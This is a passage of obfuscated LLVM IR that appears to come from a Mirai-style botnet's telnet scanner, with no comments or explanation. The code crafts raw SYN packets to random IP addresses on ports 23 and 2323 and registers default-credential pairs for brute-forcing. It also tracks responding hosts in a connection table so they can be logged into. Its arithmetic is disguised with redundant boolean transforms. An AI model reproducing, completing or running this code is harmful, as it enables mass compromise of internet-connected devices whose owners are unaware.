  %97 = load i32, i32* @rsck, align 4
  %98 = call i32 @close(i32 %97)
  call void @exit(i32 0) #8
  unreachable

; <label>:99:                                     ; preds = %83
  br label %100

; <label>:100:                                    ; preds = %111, %99
  %101 = call i32 @rand_next()
  %102 = xor i32 %101, -1
  %103 = xor i32 65535, -1
  %104 = xor i32 102657615, -1
  %105 = or i32 %102, %103
  %106 = or i32 102657615, %104
  %107 = xor i32 %105, -1
  %108 = and i32 %107, %106
  %109 = and i32 %101, 65535
  %110 = trunc i32 %108 to i16
  store i16 %110, i16* %2, align 2
  br label %111

; <label>:111:                                    ; preds = %100
  %112 = load i16, i16* %2, align 2
  %113 = call zeroext i16 @ntohs(i16 zeroext %112) #7
  %114 = zext i16 %113 to i32
  %115 = icmp slt i32 %114, 1024
  br i1 %115, label %100, label %116

; <label>:116:                                    ; preds = %111
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i64 1
  %119 = bitcast %struct.iphdr* %118 to %struct.tcphdr*
  store %struct.tcphdr* %119, %struct.tcphdr** %4, align 8
  %120 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %121 = bitcast %struct.iphdr* %120 to i8*
  %122 = load i8, i8* %121, align 4
  %123 = xor i8 %122, -1
  %124 = xor i8 -16, -1
  %125 = xor i8 102, -1
  %126 = or i8 %123, %124
  %127 = or i8 102, %125
  %128 = xor i8 %126, -1
  %129 = and i8 %128, %127
  %130 = and i8 %122, -16
  %131 = xor i8 %129, -1
  %132 = xor i8 5, -1
  %133 = xor i8 119, -1
  %134 = and i8 %131, 119
  %135 = and i8 %129, %133
  %136 = and i8 %132, 119
  %137 = and i8 5, %133
  %138 = or i8 %134, %135
  %139 = or i8 %136, %137
  %140 = xor i8 %138, %139
  %141 = or i8 %131, %132
  %142 = xor i8 %141, -1
  %143 = or i8 119, %133
  %144 = and i8 %142, %143
  %145 = or i8 %140, %144
  %146 = or i8 %129, 5
  store i8 %145, i8* %121, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = load i8, i8* %148, align 4
  %150 = xor i8 15, -1
  %151 = xor i8 %149, %150
  %152 = and i8 %151, %149
  %153 = and i8 %149, 15
  %154 = xor i8 %152, -1
  %155 = xor i8 64, -1
  %156 = xor i8 -112, -1
  %157 = and i8 %154, -112
  %158 = and i8 %152, %156
  %159 = and i8 %155, -112
  %160 = and i8 64, %156
  %161 = or i8 %157, %158
  %162 = or i8 %159, %160
  %163 = xor i8 %161, %162
  %164 = or i8 %154, %155
  %165 = xor i8 %164, -1
  %166 = or i8 -112, %156
  %167 = and i8 %165, %166
  %168 = or i8 %163, %167
  %169 = or i8 %152, 64
  store i8 %168, i8* %148, align 4
  %170 = call zeroext i16 @htons(i16 zeroext 40) #7
  %171 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 2
  store i16 %170, i16* %172, align 2
  %173 = call i32 @rand_next()
  %174 = trunc i32 %173 to i16
  %175 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 3
  store i16 %174, i16* %176, align 4
  %177 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 5
  store i8 64, i8* %178, align 4
  %179 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i8 6, i8* %180, align 1
  %181 = call zeroext i16 @htons(i16 zeroext 23) #7
  %182 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 1
  store i16 %181, i16* %183, align 2
  %184 = load i16, i16* %2, align 2
  %185 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %186 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %185, i32 0, i32 0
  store i16 %184, i16* %186, align 4
  %187 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 4
  %189 = load i16, i16* %188, align 4
  %190 = xor i16 -241, -1
  %191 = xor i16 %189, %190
  %192 = and i16 %191, %189
  %193 = and i16 %189, -241
  %194 = xor i16 %192, -1
  %195 = xor i16 80, -1
  %196 = xor i16 24933, -1
  %197 = and i16 %194, 24933
  %198 = and i16 %192, %196
  %199 = and i16 %195, 24933
  %200 = and i16 80, %196
  %201 = or i16 %197, %198
  %202 = or i16 %199, %200
  %203 = xor i16 %201, %202
  %204 = or i16 %194, %195
  %205 = xor i16 %204, -1
  %206 = or i16 24933, %196
  %207 = and i16 %205, %206
  %208 = or i16 %203, %207
  %209 = or i16 %192, 80
  store i16 %208, i16* %188, align 4
  %210 = call i32 @rand_next()
  %211 = xor i32 %210, -1
  %212 = xor i32 65535, -1
  %213 = xor i32 975581967, -1
  %214 = or i32 %211, %212
  %215 = or i32 975581967, %213
  %216 = xor i32 %214, -1
  %217 = and i32 %216, %215
  %218 = and i32 %210, 65535
  %219 = trunc i32 %217 to i16
  %220 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 5
  store i16 %219, i16* %221, align 2
  %222 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = xor i16 -513, -1
  %226 = xor i16 %224, %225
  %227 = and i16 %226, %224
  %228 = and i16 %224, -513
  %229 = and i16 %227, 512
  %230 = xor i16 %227, 512
  %231 = or i16 %229, %230
  %232 = or i16 %227, 512
  store i16 %231, i16* %223, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 15)
  br label %233

; <label>:233:                                    ; preds = %1143, %116
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %234 = load i32, i32* @fake_time, align 4
  %235 = load i32, i32* %10, align 4
  %236 = icmp ne i32 %234, %235
  br i1 %236, label %237, label %312

; <label>:237:                                    ; preds = %233
  %238 = load i32, i32* @fake_time, align 4
  store i32 %238, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %239

; <label>:239:                                    ; preds = %306, %237
  %240 = load i32, i32* %1, align 4
  %241 = icmp slt i32 %240, 384
  br i1 %241, label %242, label %311

; <label>:242:                                    ; preds = %239
  %243 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %243, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %244 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i64 1
  %246 = bitcast %struct.iphdr* %245 to %struct.tcphdr*
  store %struct.tcphdr* %246, %struct.tcphdr** %16, align 8
  %247 = call i32 @rand_next()
  %248 = trunc i32 %247 to i16
  %249 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 3
  store i16 %248, i16* %250, align 4
  %251 = load i32, i32* @LOCAL_ADDR, align 4
  %252 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 8
  store i32 %251, i32* %253, align 4
  %254 = call i32 @get_random_ip()
  %255 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 9
  store i32 %254, i32* %256, align 4
  %257 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %260 = bitcast %struct.iphdr* %259 to i16*
  %261 = call zeroext i16 @checksum_generic(i16* %260, i32 20)
  %262 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 7
  store i16 %261, i16* %263, align 2
  %264 = load i32, i32* %1, align 4
  %265 = srem i32 %264, 10
  %266 = icmp eq i32 %265, 0
  br i1 %266, label %267, label %271

; <label>:267:                                    ; preds = %242
  %268 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %269 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 1
  store i16 %268, i16* %270, align 2
  br label %275

; <label>:271:                                    ; preds = %242
  %272 = call zeroext i16 @htons(i16 zeroext 23) #7
  %273 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 1
  store i16 %272, i16* %274, align 2
  br label %275

; <label>:275:                                    ; preds = %271, %267
  %276 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 9
  %278 = load i32, i32* %277, align 4
  %279 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %280 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %279, i32 0, i32 2
  store i32 %278, i32* %280, align 4
  %281 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %282 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %281, i32 0, i32 6
  store i16 0, i16* %282, align 4
  %283 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %284 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %285 = bitcast %struct.tcphdr* %284 to i8*
  %286 = call zeroext i16 @htons(i16 zeroext 20) #7
  %287 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %283, i8* %285, i16 zeroext %286, i32 20)
  %288 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %289 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %288, i32 0, i32 6
  store i16 %287, i16* %289, align 4
  %290 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %290, align 4
  %291 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 9
  %293 = load i32, i32* %292, align 4
  %294 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %295 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %294, i32 0, i32 0
  store i32 %293, i32* %295, align 4
  %296 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 1
  %298 = load i16, i16* %297, align 2
  %299 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %298, i16* %299, align 2
  %300 = load i32, i32* @rsck, align 4
  %301 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %302 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %302, %struct.sockaddr** %301, align 8
  %303 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %304 = load %struct.sockaddr*, %struct.sockaddr** %303, align 8
  %305 = call i64 @sendto(i32 %300, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %304, i32 16)
  br label %306

; <label>:306:                                    ; preds = %275
  %307 = load i32, i32* %1, align 4
  %308 = sub i32 0, 1
  %309 = sub i32 %307, %308
  %310 = add nsw i32 %307, 1
  store i32 %309, i32* %1, align 4
  br label %239

; <label>:311:                                    ; preds = %239
  br label %312

; <label>:312:                                    ; preds = %311, %233
  store i32 0, i32* %9, align 4
  br label %313

; <label>:313:                                    ; preds = %479, %449, %434, %423, %408, %393, %382, %373, %356, %349, %342, %312
  %314 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %315 = bitcast i8* %314 to %struct.iphdr*
  store %struct.iphdr* %315, %struct.iphdr** %20, align 8
  %316 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i64 1
  %318 = bitcast %struct.iphdr* %317 to %struct.tcphdr*
  store %struct.tcphdr* %318, %struct.tcphdr** %21, align 8
  %319 = call i32* @__errno_location() #7
  store i32 0, i32* %319, align 4
  %320 = load i32, i32* @rsck, align 4
  %321 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %322 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %322, align 8
  %323 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %324 = load %struct.sockaddr*, %struct.sockaddr** %323, align 8
  %325 = call i64 @recvfrom(i32 %320, i8* %321, i64 1514, i32 16384, %struct.sockaddr* %324, i32* null)
  %326 = trunc i64 %325 to i32
  store i32 %326, i32* %18, align 4
  %327 = load i32, i32* %18, align 4
  %328 = icmp sle i32 %327, 0
  br i1 %328, label %337, label %329

; <label>:329:                                    ; preds = %313
  %330 = call i32* @__errno_location() #7
  %331 = load i32, i32* %330, align 4
  %332 = icmp eq i32 %331, 11
  br i1 %332, label %337, label %333

; <label>:333:                                    ; preds = %329
  %334 = call i32* @__errno_location() #7
  %335 = load i32, i32* %334, align 4
  %336 = icmp eq i32 %335, 11
  br i1 %336, label %337, label %338

; <label>:337:                                    ; preds = %333, %329, %313
  br label %491

; <label>:338:                                    ; preds = %333
  %339 = load i32, i32* %18, align 4
  %340 = sext i32 %339 to i64
  %341 = icmp ult i64 %340, 40
  br i1 %341, label %342, label %343

; <label>:342:                                    ; preds = %338
  br label %313

; <label>:343:                                    ; preds = %338
  %344 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i32 0, i32 9
  %346 = load i32, i32* %345, align 4
  %347 = load i32, i32* @LOCAL_ADDR, align 4
  %348 = icmp ne i32 %346, %347
  br i1 %348, label %349, label %350

; <label>:349:                                    ; preds = %343
  br label %313

; <label>:350:                                    ; preds = %343
  %351 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i32 0, i32 6
  %353 = load i8, i8* %352, align 1
  %354 = zext i8 %353 to i32
  %355 = icmp ne i32 %354, 6
  br i1 %355, label %356, label %357

; <label>:356:                                    ; preds = %350
  br label %313

; <label>:357:                                    ; preds = %350
  %358 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  %360 = load i16, i16* %359, align 4
  %361 = zext i16 %360 to i32
  %362 = call zeroext i16 @htons(i16 zeroext 23) #7
  %363 = zext i16 %362 to i32
  %364 = icmp ne i32 %361, %363
  br i1 %364, label %365, label %374

; <label>:365:                                    ; preds = %357
  %366 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 0
  %368 = load i16, i16* %367, align 4
  %369 = zext i16 %368 to i32
  %370 = call zeroext i16 @htons(i16 zeroext 2323) #7
  %371 = zext i16 %370 to i32
  %372 = icmp ne i32 %369, %371
  br i1 %372, label %373, label %374

; <label>:373:                                    ; preds = %365
  br label %313

; <label>:374:                                    ; preds = %365, %357
  %375 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %376 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %375, i32 0, i32 1
  %377 = load i16, i16* %376, align 2
  %378 = zext i16 %377 to i32
  %379 = load i16, i16* %2, align 2
  %380 = zext i16 %379 to i32
  %381 = icmp ne i32 %378, %380
  br i1 %381, label %382, label %383

; <label>:382:                                    ; preds = %374
  br label %313

; <label>:383:                                    ; preds = %374
  %384 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 4
  %387 = lshr i16 %386, 9
  %388 = xor i16 1, -1
  %389 = xor i16 %387, %388
  %390 = and i16 %389, %387
  %391 = and i16 %387, 1
  %392 = icmp ne i16 %390, 0
  br i1 %392, label %394, label %393

; <label>:393:                                    ; preds = %383
  br label %313

; <label>:394:                                    ; preds = %383
  %395 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 4
  %397 = load i16, i16* %396, align 4
  %398 = lshr i16 %397, 12
  %399 = xor i16 %398, -1
  %400 = xor i16 1, -1
  %401 = xor i16 -526, -1
  %402 = or i16 %399, %400
  %403 = or i16 -526, %401
  %404 = xor i16 %402, -1
  %405 = and i16 %404, %403
  %406 = and i16 %398, 1
  %407 = icmp ne i16 %405, 0
  br i1 %407, label %409, label %408

; <label>:408:                                    ; preds = %394
  br label %313

; <label>:409:                                    ; preds = %394
  %410 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 4
  %412 = load i16, i16* %411, align 4
  %413 = lshr i16 %412, 10
  %414 = xor i16 %413, -1
  %415 = xor i16 1, -1
  %416 = xor i16 5398, -1
  %417 = or i16 %414, %415
  %418 = or i16 5398, %416
  %419 = xor i16 %417, -1
  %420 = and i16 %419, %418
  %421 = and i16 %413, 1
  %422 = icmp ne i16 %420, 0
  br i1 %422, label %423, label %424

; <label>:423:                                    ; preds = %409
  br label %313

; <label>:424:                                    ; preds = %409
  %425 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 4
  %427 = load i16, i16* %426, align 4
  %428 = lshr i16 %427, 8
  %429 = xor i16 1, -1
  %430 = xor i16 %428, %429
  %431 = and i16 %430, %428
  %432 = and i16 %428, 1
  %433 = icmp ne i16 %431, 0
  br i1 %433, label %434, label %435

; <label>:434:                                    ; preds = %424
  br label %313

; <label>:435:                                    ; preds = %424
  %436 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %437 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %436, i32 0, i32 3
  %438 = load i32, i32* %437, align 4
  %439 = call i32 @ntohl(i32 %438) #7
  %440 = sub i32 %439, -1793583289
  %441 = sub i32 %440, 1
  %442 = add i32 %441, -1793583289
  %443 = sub i32 %439, 1
  %444 = call i32 @htonl(i32 %442) #7
  %445 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %446 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %445, i32 0, i32 8
  %447 = load i32, i32* %446, align 4
  %448 = icmp ne i32 %444, %447
  br i1 %448, label %449, label %450

; <label>:449:                                    ; preds = %435
  br label %313

; <label>:450:                                    ; preds = %435
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %451 = load i32, i32* %9, align 4
  store i32 %451, i32* %18, align 4
  br label %452

; <label>:452:                                    ; preds = %470, %450
  %453 = load i32, i32* %18, align 4
  %454 = icmp slt i32 %453, 256
  br i1 %454, label %455, label %475

; <label>:455:                                    ; preds = %452
  %456 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %457 = load i32, i32* %18, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %456, i64 %458
  %460 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %459, i32 0, i32 3
  %461 = load i32, i32* %460, align 8
  %462 = icmp eq i32 %461, 0
  br i1 %462, label %463, label %469

; <label>:463:                                    ; preds = %455
  %464 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %465 = load i32, i32* %18, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %464, i64 %466
  store %struct.scanner_connection* %467, %struct.scanner_connection** %22, align 8
  %468 = load i32, i32* %18, align 4
  store i32 %468, i32* %9, align 4
  br label %475

; <label>:469:                                    ; preds = %455
  br label %470

; <label>:470:                                    ; preds = %469
  %471 = load i32, i32* %18, align 4
  %472 = sub i32 0, 1
  %473 = sub i32 %471, %472
  %474 = add nsw i32 %471, 1
  store i32 %473, i32* %18, align 4
  br label %452

; <label>:475:                                    ; preds = %463, %452
  %476 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %477 = icmp eq %struct.scanner_connection* %476, null
  br i1 %477, label %478, label %479

; <label>:478:                                    ; preds = %475
  br label %491

; <label>:479:                                    ; preds = %475
  %480 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 8
  %482 = load i32, i32* %481, align 4
  %483 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %484 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %483, i32 0, i32 4
  store i32 %482, i32* %484, align 4
  %485 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %486 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %485, i32 0, i32 0
  %487 = load i16, i16* %486, align 4
  %488 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %489 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %488, i32 0, i32 5
  store i16 %487, i16* %489, align 8
  %490 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %490)
  br label %313

; <label>:491:                                    ; preds = %478, %337
  br label %492

; <label>:492:                                    ; preds = %491
  %493 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %5, i32 0, i32 0
  %494 = getelementptr inbounds [16 x i64], [16 x i64]* %493, i64 0, i64 0
  %495 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %494) #6, !srcloc !1
  %496 = extractvalue { i64, i64* } %495, 0
  %497 = extractvalue { i64, i64* } %495, 1
  %498 = trunc i64 %496 to i32
  store i32 %498, i32* %24, align 4
  %499 = ptrtoint i64* %497 to i64
  %500 = trunc i64 %499 to i32
  store i32 %500, i32* %25, align 4
  br label %501

; <label>:501:                                    ; preds = %492
  br label %502

; <label>:502:                                    ; preds = %501
  %503 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %6, i32 0, i32 0
  %504 = getelementptr inbounds [16 x i64], [16 x i64]* %503, i64 0, i64 0
  %505 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %504) #6, !srcloc !2
  %506 = extractvalue { i64, i64* } %505, 0
  %507 = extractvalue { i64, i64* } %505, 1
  %508 = trunc i64 %506 to i32
  store i32 %508, i32* %26, align 4
  %509 = ptrtoint i64* %507 to i64
  %510 = trunc i64 %509 to i32
  store i32 %510, i32* %27, align 4
  br label %511

; <label>:511:                                    ; preds = %502
  store i32 0, i32* %1, align 4
  br label %512

; <label>:512:                                    ; preds = %669, %511
  %513 = load i32, i32* %1, align 4
  %514 = icmp slt i32 %513, 256
  br i1 %514, label %515, label %674

; <label>:515:                                    ; preds = %512
  %516 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %517 = load i32, i32* %1, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %516, i64 %518
  store %struct.scanner_connection* %519, %struct.scanner_connection** %7, align 8
  %520 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %521 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %520, i32 0, i32 3
  %522 = load i32, i32* %521, align 8
  %523 = icmp ugt i32 %522, 1
  %524 = select i1 %523, i32 30, i32 5
  store i32 %524, i32* %28, align 4
  %525 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %526 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %525, i32 0, i32 3
  %527 = load i32, i32* %526, align 8
  %528 = icmp ne i32 %527, 0
  br i1 %528, label %529, label %575

; <label>:529:                                    ; preds = %515
  %530 = load i32, i32* @fake_time, align 4
  %531 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %532 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %531, i32 0, i32 2
  %533 = load i32, i32* %532, align 4
  %534 = sub i32 %530, -78402012
  %535 = sub i32 %534, %533
  %536 = add i32 %535, -78402012
  %537 = sub i32 %530, %533
  %538 = load i32, i32* %28, align 4
  %539 = icmp ugt i32 %536, %538
  br i1 %539, label %540, label %575

; <label>:540:                                    ; preds = %529
  %541 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %542 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %541, i32 0, i32 1
  %543 = load i32, i32* %542, align 8
  %544 = call i32 @close(i32 %543)
  %545 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %546 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %545, i32 0, i32 1
  store i32 -1, i32* %546, align 8
  %547 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %548 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %547, i32 0, i32 3
